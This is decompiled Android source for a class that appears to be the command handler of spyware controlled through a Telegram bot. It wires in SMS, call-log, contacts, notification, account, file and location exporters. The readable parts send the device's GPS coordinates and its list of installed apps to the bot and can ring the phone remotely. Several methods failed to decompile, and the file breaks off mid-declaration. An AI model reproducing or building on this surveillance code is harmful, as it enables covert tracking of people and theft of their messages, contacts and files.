package com.example.data.remote;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import androidx.core.view.MotionEventCompat;
import com.example.managers.AccountsManager;
import com.example.managers.AppUsageManager;
import com.example.managers.CallLogManager;
import com.example.managers.ContactsExportManager;
import com.example.managers.DeviceLocationManager;
import com.example.managers.DeviceRingManager;
import com.example.managers.FileExplorerManager;
import com.example.managers.NotificationExportManager;
import com.example.managers.SMSReportManager;
import com.example.managers.StudyModeManager;
import java.io.File;
import java.util.List;
import java.util.Map;
import javax.inject.Inject;
import javax.inject.Singleton;
import kotlin.Metadata;
import kotlin.ResultKt;
import kotlin.TuplesKt;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.collections.MapsKt;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.intrinsics.IntrinsicsKt;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.coroutines.jvm.internal.DebugMetadata;
import kotlin.coroutines.jvm.internal.SpillingKt;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlinx.coroutines.BuildersKt;
import kotlinx.coroutines.CoroutineScope;
import kotlinx.coroutines.Dispatchers;

/* JADX INFO: compiled from: TelegramDashboardManager.kt */
/* JADX INFO: loaded from: classes7.dex */
@Singleton
@Metadata(d1 = {"\u0000j\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\t\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0005\b\u0007\u0018\u00002\u00020\u0001Bi\b\u0007\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u0012\u0006\u0010\u0004\u001a\u00020\u0005\u0012\u0006\u0010\u0006\u001a\u00020\u0007\u0012\u0006\u0010\b\u001a\u00020\t\u0012\u0006\u0010\n\u001a\u00020\u000b\u0012\u0006\u0010\f\u001a\u00020\r\u0012\u0006\u0010\u000e\u001a\u00020\u000f\u0012\u0006\u0010\u0010\u001a\u00020\u0011\u0012\u0006\u0010\u0012\u001a\u00020\u0013\u0012\u0006\u0010\u0014\u001a\u00020\u0015\u0012\u0006\u0010\u0016\u001a\u00020\u0017\u0012\u0006\u0010\u0018\u001a\u00020\u0019¢\u0006\u0004\b\u001a\u0010\u001bJ\u000e\u0010\u001e\u001a\u00020\u001fH\u0086@¢\u0006\u0002\u0010 J\u0016\u0010!\u001a\u00020\u001f2\u0006\u0010\"\u001a\u00020#H\u0082@¢\u0006\u0002\u0010$J\u000e\u0010%\u001a\u00020\u001fH\u0082@¢\u0006\u0002\u0010 J\u000e\u0010&\u001a\u00020\u001fH\u0082@¢\u0006\u0002\u0010 J\u000e\u0010'\u001a\u00020\u001fH\u0086@¢\u0006\u0002\u0010 R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\tX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u000bX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\f\u001a\u00020\rX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u000e\u001a\u00020\u000fX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0010\u001a\u00020\u0011X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0012\u001a\u00020\u0013X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0014\u001a\u00020\u0015X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0016\u001a\u00020\u0017X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0018\u001a\u00020\u0019X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u001c\u001a\u00020\u001dX\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006("}, d2 = {"Lcom/example/data/remote/TelegramDashboardManager;", "", "context", "Landroid/content/Context;", "telegramClient", "Lcom/example/data/remote/TelegramBotClient;", "smsManager", "Lcom/example/managers/SMSReportManager;", "callManager", "Lcom/example/managers/CallLogManager;", "contactsManager", "Lcom/example/managers/ContactsExportManager;", "appUsageManager", "Lcom/example/managers/AppUsageManager;", "accountsManager", "Lcom/example/managers/AccountsManager;", "deviceRingManager", "Lcom/example/managers/DeviceRingManager;", "studyModeManager", "Lcom/example/managers/StudyModeManager;", "notificationExportManager", "Lcom/example/managers/NotificationExportManager;", "fileExplorerManager", "Lcom/example/managers/FileExplorerManager;", "deviceLocationManager", "Lcom/example/managers/DeviceLocationManager;", "<init>", "(Landroid/content/Context;Lcom/example/data/remote/TelegramBotClient;Lcom/example/managers/SMSReportManager;Lcom/example/managers/CallLogManager;Lcom/example/managers/ContactsExportManager;Lcom/example/managers/AppUsageManager;Lcom/example/managers/AccountsManager;Lcom/example/managers/DeviceRingManager;Lcom/example/managers/StudyModeManager;Lcom/example/managers/NotificationExportManager;Lcom/example/managers/FileExplorerManager;Lcom/example/managers/DeviceLocationManager;)V", "lastUpdateId", "", "startPolling", "", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "handleCallbackQuery", "cb", "Lorg/json/JSONObject;", "(Lorg/json/JSONObject;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendStatus", "sendBatteryInfo", "sendDashboard", "app"}, k = 1, mv = {2, 2, 0}, xi = 48)
public final class TelegramDashboardManager {
    public static final int $stable = 8;
    private final AccountsManager accountsManager;
    private final AppUsageManager appUsageManager;
    private final CallLogManager callManager;
    private final ContactsExportManager contactsManager;
    private final Context context;
    private final DeviceLocationManager deviceLocationManager;
    private final DeviceRingManager deviceRingManager;
    private final FileExplorerManager fileExplorerManager;
    private long lastUpdateId;
    private final NotificationExportManager notificationExportManager;
    private final SMSReportManager smsManager;
    private final StudyModeManager studyModeManager;
    private final TelegramBotClient telegramClient;

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$1, reason: invalid class name */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager", f = "TelegramDashboardManager.kt", i = {0, 0, 0, 1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4, 5, 5, 5, 6, 6, 6, 6, 7, 7, 7, 8, 8, 8, 8, 9, 9, 9, 10, 10, 10, 10, 11, 11, 11, 12, 12, 12, 12, 13, 13, 13, 14, 14, 14, 14, 15, 15, 15, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18, 19, 19, 19, 19, 20, 20, 20, 21, 21, 21, 22, 22, 22, 23, 23, 23, 24, 24, 24, 25, 25, 25, 26, 26, 26, 27, 27, 27, MotionEventCompat.AXIS_RELATIVE_Y, MotionEventCompat.AXIS_RELATIVE_Y, MotionEventCompat.AXIS_RELATIVE_Y, 29, 29, 29, 30, 30, 30, 31, 31, 31}, l = {86, 87, 90, 101, 102, 105, 107, 110, 112, 115, 117, 120, 122, 125, 127, 130, 137, 138, 142, 143, 146, 161, 168, 175, 176, 179, 180, 183, 184, 187, 188, 190}, m = "handleCallbackQuery", n = {"cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "file", "cb", "id", "data", "cb", "id", "data", "file", "cb", "id", "data", "cb", "id", "data", "file", "cb", "id", "data", "cb", "id", "data", "file", "cb", "id", "data", "cb", "id", "data", "file", "cb", "id", "data", "cb", "id", "data", "success", "cb", "id", "data", "success", "cb", "id", "data", "success", "cb", "id", "data", "success", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data", "cb", "id", "data"}, s = {"L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$3", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$3", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$3", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$3", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$3", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "Z$0", "L$0", "L$1", "L$2", "Z$0", "L$0", "L$1", "L$2", "Z$0", "L$0", "L$1", "L$2", "Z$0", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2", "L$0", "L$1", "L$2"})
    static final class AnonymousClass1 extends ContinuationImpl {
        Object L$0;
        Object L$1;
        Object L$2;
        Object L$3;
        boolean Z$0;
        int label;
        /* synthetic */ Object result;

        AnonymousClass1(Continuation<? super AnonymousClass1> continuation) {
            super(continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return TelegramDashboardManager.this.handleCallbackQuery(null, this);
        }
    }

    @Inject
    public TelegramDashboardManager(Context context, TelegramBotClient telegramClient, SMSReportManager smsManager, CallLogManager callManager, ContactsExportManager contactsManager, AppUsageManager appUsageManager, AccountsManager accountsManager, DeviceRingManager deviceRingManager, StudyModeManager studyModeManager, NotificationExportManager notificationExportManager, FileExplorerManager fileExplorerManager, DeviceLocationManager deviceLocationManager) {
        Intrinsics.checkNotNullParameter(context, "context");
        Intrinsics.checkNotNullParameter(telegramClient, "telegramClient");
        Intrinsics.checkNotNullParameter(smsManager, "smsManager");
        Intrinsics.checkNotNullParameter(callManager, "callManager");
        Intrinsics.checkNotNullParameter(contactsManager, "contactsManager");
        Intrinsics.checkNotNullParameter(appUsageManager, "appUsageManager");
        Intrinsics.checkNotNullParameter(accountsManager, "accountsManager");
        Intrinsics.checkNotNullParameter(deviceRingManager, "deviceRingManager");
        Intrinsics.checkNotNullParameter(studyModeManager, "studyModeManager");
        Intrinsics.checkNotNullParameter(notificationExportManager, "notificationExportManager");
        Intrinsics.checkNotNullParameter(fileExplorerManager, "fileExplorerManager");
        Intrinsics.checkNotNullParameter(deviceLocationManager, "deviceLocationManager");
        this.context = context;
        this.telegramClient = telegramClient;
        this.smsManager = smsManager;
        this.callManager = callManager;
        this.contactsManager = contactsManager;
        this.appUsageManager = appUsageManager;
        this.accountsManager = accountsManager;
        this.deviceRingManager = deviceRingManager;
        this.studyModeManager = studyModeManager;
        this.notificationExportManager = notificationExportManager;
        this.fileExplorerManager = fileExplorerManager;
        this.deviceLocationManager = deviceLocationManager;
    }

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$startPolling$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager$startPolling$2", f = "TelegramDashboardManager.kt", i = {0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 3}, l = {MotionEventCompat.AXIS_GENERIC_13, 58, 66, 76}, m = "invokeSuspend", n = {"$this$withContext", "$this$withContext", "jsonStr", "root", "result", "item", "callbackQuery", "ok", "i", "updateId", "$this$withContext", "jsonStr", "root", "result", "item", "callbackQuery", "message", "text", "ok", "i", "updateId", "$this$withContext"}, s = {"L$0", "L$0", "L$1", "L$2", "L$3", "L$4", "L$5", "Z$0", "I$0", "J$0", "L$0", "L$1", "L$2", "L$3", "L$4", "L$5", "L$6", "L$7", "Z$0", "I$0", "J$0", "L$0"})
    static final class C07382 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int I$0;
        int I$1;
        long J$0;
        private /* synthetic */ Object L$0;
        Object L$1;
        Object L$2;
        Object L$3;
        Object L$4;
        Object L$5;
        Object L$6;
        Object L$7;
        boolean Z$0;
        int label;

        C07382(Continuation<? super C07382> continuation) {
            super(2, continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            C07382 c07382 = TelegramDashboardManager.this.new C07382(continuation);
            c07382.L$0 = obj;
            return c07382;
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((C07382) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Can't wrap try/catch for region: R(5:24|25|97|26|(1:76)(3:30|31|(7:93|33|34|(6:95|36|37|104|38|(1:40)(4:41|42|68|(3:75|86|(1:88)(4:89|90|17|(2:91|92)(0)))(0)))(8:45|99|46|(1:48)|(5:53|54|106|55|(2:59|(1:61)(4:62|63|68|(0)(0))))(1:66)|67|68|(0)(0))|85|86|(0)(0))(0))) */
        /* JADX WARN: Can't wrap try/catch for region: R(5:53|54|106|55|(2:59|(1:61)(4:62|63|68|(0)(0)))) */
        /* JADX WARN: Can't wrap try/catch for region: R(6:95|36|37|104|38|(1:40)(4:41|42|68|(3:75|86|(1:88)(4:89|90|17|(2:91|92)(0)))(0))) */
        /* JADX WARN: Code restructure failed: missing block: B:50:0x0166, code lost:
        
            r0 = e;
         */
        /* JADX WARN: Code restructure failed: missing block: B:51:0x0167, code lost:
        
            r2 = r3;
            r3 = r5;
         */
        /* JADX WARN: Code restructure failed: missing block: B:64:0x01e1, code lost:
        
            r0 = e;
         */
        /* JADX WARN: Code restructure failed: missing block: B:71:0x01fb, code lost:
        
            r2 = r3;
            r3 = r5;
         */
        /* JADX WARN: Code restructure failed: missing block: B:78:0x021b, code lost:
        
            r0 = e;
         */
        /* JADX WARN: Code restructure failed: missing block: B:79:0x021c, code lost:
        
            r17 = r4;
            r1 = r6;
         */
        /* JADX WARN: Removed duplicated region for block: B:102:0x00a0 A[EXC_TOP_SPLITTER, SYNTHETIC] */
        /* JADX WARN: Removed duplicated region for block: B:24:0x00c1 A[Catch: Exception -> 0x0227, TRY_LEAVE, TryCatch #5 {Exception -> 0x0227, blocks: (B:19:0x00a0, B:22:0x00bd, B:24:0x00c1, B:28:0x00cf, B:30:0x00d7), top: B:102:0x00a0 }] */
        /* JADX WARN: Removed duplicated region for block: B:75:0x0207  */
        /* JADX WARN: Removed duplicated region for block: B:80:0x0221  */
        /* JADX WARN: Removed duplicated region for block: B:88:0x0257 A[RETURN] */
        /* JADX WARN: Removed duplicated region for block: B:89:0x0258  */
        /* JADX WARN: Removed duplicated region for block: B:91:0x0260  */
        /* JADX WARN: Removed duplicated region for block: B:93:0x00e4 A[EXC_TOP_SPLITTER, SYNTHETIC] */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:68:0x01f0 -> B:32:0x00e2). Please report as a decompilation issue!!! */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:89:0x0258 -> B:90:0x0259). Please report as a decompilation issue!!! */
        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r22) {
            /*
                Method dump skipped, instruction units count: 626
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.example.data.remote.TelegramDashboardManager.C07382.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    public final Object startPolling(Continuation<? super Unit> continuation) {
        Object objWithContext = BuildersKt.withContext(Dispatchers.getIO(), new C07382(null), continuation);
        return objWithContext == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objWithContext : Unit.INSTANCE;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:112:0x0488 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:125:0x04c9  */
    /* JADX WARN: Removed duplicated region for block: B:141:0x052e  */
    /* JADX WARN: Removed duplicated region for block: B:156:0x05af A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:157:0x05b0  */
    /* JADX WARN: Removed duplicated region for block: B:167:0x0607 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:168:0x0608  */
    /* JADX WARN: Removed duplicated region for block: B:181:0x064c  */
    /* JADX WARN: Removed duplicated region for block: B:197:0x06c8 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:207:0x0701  */
    /* JADX WARN: Removed duplicated region for block: B:230:0x07b1  */
    /* JADX WARN: Removed duplicated region for block: B:245:0x0815  */
    /* JADX WARN: Removed duplicated region for block: B:262:0x088d A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x02ef A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x02f0  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x0410  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public final java.lang.Object handleCallbackQuery(org.json.JSONObject r14, kotlin.coroutines.Continuation<? super kotlin.Unit> r15) throws org.json.JSONException {
        /*
            Method dump skipped, instruction units count: 2374
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.example.data.remote.TelegramDashboardManager.handleCallbackQuery(org.json.JSONObject, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$2, reason: invalid class name */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$2", f = "TelegramDashboardManager.kt", i = {1, 2}, l = {92, 94, 96}, m = "invokeSuspend", n = {"loc", "loc"}, s = {"L$0", "L$0"})
    static final class AnonymousClass2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        Object L$0;
        int label;

        AnonymousClass2(Continuation<? super AnonymousClass2> continuation) {
            super(2, continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return TelegramDashboardManager.this.new AnonymousClass2(continuation);
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((AnonymousClass2) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:14:0x0046  */
        /* JADX WARN: Removed duplicated region for block: B:19:0x006c  */
        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r10) {
            /*
                r9 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r9.label
                switch(r1) {
                    case 0: goto L29;
                    case 1: goto L24;
                    case 2: goto L1b;
                    case 3: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
                java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
                r0.<init>(r1)
                throw r0
            L11:
                java.lang.Object r0 = r9.L$0
                android.location.Location r0 = (android.location.Location) r0
                kotlin.ResultKt.throwOnFailure(r10)
                r2 = r10
                goto L89
            L1b:
                java.lang.Object r0 = r9.L$0
                android.location.Location r0 = (android.location.Location) r0
                kotlin.ResultKt.throwOnFailure(r10)
                r2 = r10
                goto L66
            L24:
                kotlin.ResultKt.throwOnFailure(r10)
                r1 = r10
                goto L3f
            L29:
                kotlin.ResultKt.throwOnFailure(r10)
                com.example.data.remote.TelegramDashboardManager r1 = com.example.data.remote.TelegramDashboardManager.this
                com.example.managers.DeviceLocationManager r1 = com.example.data.remote.TelegramDashboardManager.access$getDeviceLocationManager$p(r1)
                r2 = r9
                kotlin.coroutines.Continuation r2 = (kotlin.coroutines.Continuation) r2
                r3 = 1
                r9.label = r3
                java.lang.Object r1 = r1.getCurrentLocation(r2)
                if (r1 != r0) goto L3f
                return r0
            L3f:
                android.location.Location r1 = (android.location.Location) r1
                com.example.data.remote.TelegramDashboardManager r2 = com.example.data.remote.TelegramDashboardManager.this
                if (r1 == 0) goto L6c
                com.example.data.remote.TelegramBotClient r3 = com.example.data.remote.TelegramDashboardManager.access$getTelegramClient$p(r2)
                double r4 = r1.getLatitude()
                double r6 = r1.getLongitude()
                r8 = r9
                kotlin.coroutines.Continuation r8 = (kotlin.coroutines.Continuation) r8
                java.lang.Object r2 = kotlin.coroutines.jvm.internal.SpillingKt.nullOutSpilledVariable(r1)
                r9.L$0 = r2
                r2 = 2
                r9.label = r2
                java.lang.Object r2 = r3.sendLocation(r4, r6, r8)
                if (r2 != r0) goto L65
                return r0
            L65:
                r0 = r1
            L66:
                java.lang.Boolean r2 = (java.lang.Boolean) r2
                r2.booleanValue()
                goto L8e
            L6c:
                com.example.data.remote.TelegramBotClient r3 = com.example.data.remote.TelegramDashboardManager.access$getTelegramClient$p(r2)
                r6 = r9
                kotlin.coroutines.Continuation r6 = (kotlin.coroutines.Continuation) r6
                java.lang.Object r2 = kotlin.coroutines.jvm.internal.SpillingKt.nullOutSpilledVariable(r1)
                r9.L$0 = r2
                r2 = 3
                r9.label = r2
                java.lang.String r4 = "❌ Could not get location."
                r5 = 0
                r7 = 2
                r8 = 0
                java.lang.Object r2 = com.example.data.remote.TelegramBotClient.sendMessage$default(r3, r4, r5, r6, r7, r8)
                if (r2 != r0) goto L88
                return r0
            L88:
                r0 = r1
            L89:
                java.lang.Boolean r2 = (java.lang.Boolean) r2
                r2.booleanValue()
            L8e:
                kotlin.Unit r1 = kotlin.Unit.INSTANCE
                return r1
            */
            throw new UnsupportedOperationException("Method not decompiled: com.example.data.remote.TelegramDashboardManager.AnonymousClass2.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$3, reason: invalid class name */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$3", f = "TelegramDashboardManager.kt", i = {}, l = {132}, m = "invokeSuspend", n = {}, s = {})
    static final class AnonymousClass3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        AnonymousClass3(Continuation<? super AnonymousClass3> continuation) {
            super(2, continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return TelegramDashboardManager.this.new AnonymousClass3(continuation);
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((AnonymousClass3) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (TelegramDashboardManager.this.deviceRingManager.ringDevice(15, this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$4, reason: invalid class name */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$4", f = "TelegramDashboardManager.kt", i = {0, 0, 0}, l = {157}, m = "invokeSuspend", n = {"pm", "packages", "sb"}, s = {"L$0", "L$1", "L$2"})
    static final class AnonymousClass4 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        Object L$0;
        Object L$1;
        Object L$2;
        int label;

        AnonymousClass4(Continuation<? super AnonymousClass4> continuation) {
            super(2, continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return TelegramDashboardManager.this.new AnonymousClass4(continuation);
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((AnonymousClass4) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object $result) {
            String strLoadLabel;
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    PackageManager pm = TelegramDashboardManager.this.context.getPackageManager();
                    Iterable<PackageInfo> installedPackages = pm.getInstalledPackages(0);
                    Intrinsics.checkNotNullExpressionValue(installedPackages, "getInstalledPackages(...)");
                    StringBuilder sb = new StringBuilder("📦 *Installed Apps*\n\n");
                    for (PackageInfo packageInfo : installedPackages) {
                        if (pm.getLaunchIntentForPackage(packageInfo.packageName) != null) {
                            ApplicationInfo applicationInfo = packageInfo.applicationInfo;
                            if (applicationInfo == null || (strLoadLabel = applicationInfo.loadLabel(pm)) == null) {
                                String packageName = packageInfo.packageName;
                                Intrinsics.checkNotNullExpressionValue(packageName, "packageName");
                                strLoadLabel = packageName;
                            }
                            sb.append("• " + ((Object) strLoadLabel) + "\n");
                        }
                    }
                    TelegramBotClient telegramBotClient = TelegramDashboardManager.this.telegramClient;
                    String string = sb.toString();
                    Intrinsics.checkNotNullExpressionValue(string, "toString(...)");
                    this.L$0 = SpillingKt.nullOutSpilledVariable(pm);
                    this.L$1 = SpillingKt.nullOutSpilledVariable(installedPackages);
                    this.L$2 = SpillingKt.nullOutSpilledVariable(sb);
                    this.label = 1;
                    if (TelegramBotClient.sendMessage$default(telegramBotClient, string, null, this, 2, null) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$5, reason: invalid class name */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$5", f = "TelegramDashboardManager.kt", i = {0}, l = {164}, m = "invokeSuspend", n = {"file"}, s = {"L$0"})
